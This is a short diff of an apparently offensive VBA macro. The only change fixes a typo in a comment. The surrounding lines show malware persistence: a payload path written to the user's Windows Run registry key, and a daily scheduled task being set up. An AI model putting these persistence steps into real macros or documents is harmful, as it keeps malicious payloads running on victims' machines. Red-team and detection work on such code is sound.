@@ -43,7 +43,7 @@ Private Sub CommandButton1_Click()
    objRegistry.SetStringValue &H80000001, "Software\Microsoft\Windows\CurrentVersion\Run", "<registry key name>", Environ("LocalAppData") & "\Microsoft\Windows\payload.ext"
 
 
-'persistence using task scheduler, the task will be executed everyday at the time when the macro is first execute
+'persistence using task scheduler, the task will be executed everyday at the time when the macro is first executed
 
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
